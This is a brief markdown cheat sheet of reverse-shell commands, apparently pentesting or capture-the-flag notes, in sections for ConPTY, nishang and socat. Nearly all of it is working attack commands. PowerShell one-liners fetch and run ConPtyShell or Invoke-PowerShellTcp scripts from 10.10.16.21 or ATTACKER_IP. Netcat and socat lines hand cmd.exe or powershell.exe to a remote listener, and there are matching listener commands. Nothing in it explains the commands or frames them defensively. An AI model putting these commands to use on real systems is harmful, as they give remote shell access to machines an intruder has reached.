## ConPTY
```
<<On linux>>
bash
stty sane
stty raw -echo; (stty size; cat) | nc -lvnp 4444


<<windows>>
IEX(IWR http://10.10.16.21:3000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.16.21 4444

```

## nishang
```sh
cd /nishang/Shells/  --> Invoke-PowerShellTcp.ps1
python -m simpleHTTBserver
```
```powershell

IEX(IWR http://10.10.16.21:3000/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 4444

powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.21:3000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.21 -Port 4444




or for specific file location
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.16.21:3000/Invoke-PowerShellTcp.ps1','C:\Users\Public\Invoke-PowerShellTcp.ps1'); & 'C:\Users\Public\Invoke-PowerShellTcp.ps1'"


IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444
```

```
nc.exe -nv 10.10.16.21 4444 -e cmd.exe
```


## socat
Interactive shell
```sh
socat file:`tty`,raw,echo=0 TCP-L:4444
```
```powershell
socat.exe TCP:10.10.16.21:4443 EXEC:powershell.exe,pipes

socat.exe TCP4:10.10.16.21:4443 EXEC:'powershell.exe',pipes
```
